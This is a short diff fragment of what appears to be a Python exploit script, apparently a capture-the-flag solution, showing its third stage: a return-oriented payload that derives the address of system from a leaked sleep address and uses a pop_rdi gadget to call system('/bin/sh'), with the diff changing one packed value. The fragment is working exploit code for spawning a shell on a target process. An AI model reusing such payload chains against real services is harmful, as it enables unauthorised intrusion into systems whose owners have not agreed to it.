@@ -43,7 +43,7 @@ system_addr = sleep_addr - 550016
 
 #stage 3 call system("/bin/sh")
 pl3 = pack("<QQQ QQQ"
-	, binbash, binbash, binsh
+	, binbash, binbash, binbash
         , pop_rdi, binbash, system_addr 
 )
 r.sendline(pl3)
